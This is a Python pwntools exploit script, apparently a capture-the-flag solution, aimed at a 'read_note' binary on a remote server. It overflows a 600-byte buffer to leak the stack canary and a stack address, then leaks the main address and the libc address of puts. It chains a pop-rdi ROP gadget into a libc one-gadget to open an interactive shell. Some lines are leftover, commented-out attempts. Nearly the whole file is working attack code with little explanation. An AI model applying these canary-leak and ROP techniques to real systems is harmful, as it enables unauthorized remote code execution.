from pwn import *
#context.log_level = 'debug'
file = ELF('./read_note')
#p = process('./read_note')
p = remote('114.116.54.89', 10000)


p.recvuntil('path:\n')

p.send('a'*7)

p.recvuntil('len:\n')

p.sendline('1234')

p.recvuntil('note:\n')

leak_canary = 'a'*601

p.send(leak_canary)

p.recvuntil(leak_canary)

canary = u64('\x00'+p.recv(7))
success("canary => "+hex(canary))
stack_in_vul = u64(p.recv(6)+'\x00\x00')
success("stack in vul => "+hex(stack_in_vul))

p.recvuntil('624)\n')

ret_main = 'a'*600+p64(canary)+p64(stack_in_vul)+'\x29'
p.send(ret_main)

# success ret to main and get the canary
# now is to leak libc
# we need to now where the code start
# in stack after canary , we have vul ret to main addr
# so we can leak main addr like leak canary
# padding is 600+8+8+2

p.recvuntil('path:\n')
p.send('a'*7)

p.recvuntil('len:\n')

p.sendline('616')
# leak main addr
p.recvuntil('note:\n')
leak_main = 'a'*616
p.send(leak_main)
p.recvuntil('a'*616)
main_addr = u64(p.recv(6)+'\x00\x00')-0xe
call_vul = main_addr+9
success("main addr => "+hex(main_addr))
code_start_addr = main_addr-0xd20
success("code start => "+hex(code_start_addr))
puts_got = file.got['puts']+code_start_addr
puts_plt = file.plt['puts']+code_start_addr
success("puts got => "+hex(puts_got))
success("puts plt => "+hex(puts_plt))
# 0x0000000000000e03 : pop rdi ; ret
# now is to get the libc
# stack : [canary][stack][pop rdi,ret][puts_got][puts_plt]
p.recvuntil('624)\n')
p.send(ret_main)

p.recvuntil('path:\n')
p.send('nononono')
p.recvuntil('len:\n')
p.sendline('1000')
p.recvuntil('note:\n')
pop_rdi = code_start_addr+0xe03
call_puts = code_start_addr+0xB48
ready_stack = 'a'*600+p64(canary)+p64(stack_in_vul)+p64(pop_rdi) + \
    p64(puts_got)+p64(call_puts)+p64(call_vul)
# ret_main+p64(puts_got)+p64(puts_plt)+p64(call_vul)
p.send(ready_stack)

p.recvuntil('624)\n')

get_glibc = 'a'*600
p.send(get_glibc)
puts_glibc = u64(p.recv(6)+'\x00\x00')

success("puts glibc => "+hex(puts_glibc))
# libc6_2.23-0ubuntu10_amd64
# getshell 0xf1153
glibc_base = puts_glibc-0x6F690
getshell_glibc = glibc_base+0xF1147
# yes:0xE7660
str_bin = glibc_base+0x18cd57
p.recvuntil('path:\n')
p.send('nonono')
p.recvuntil('len:\n')
p.sendline('1000')
p.recvuntil('note:\n')  # why can not get back
payload_ = 'a'*600+p64(canary)+p64(stack_in_vul)+p64(pop_rdi)+'/bin/sh'+'\x00'+p64(getshell_glibc)
payload = 'a'*60
p.send(payload)
p.recvuntil('624)\n')
payload = 'a'*600+p64(canary)+p64(stack_in_vul)+p64(getshell_glibc)
p.send(payload)

p.interactive()
# p.send(payload_)
# p.recvuntil('624)\n')
# payload = 'a'*600+p64(canary)+p64(stack_in_vul)+p64(getshell_glibc)
# p.send(payload)
# p.interactive()
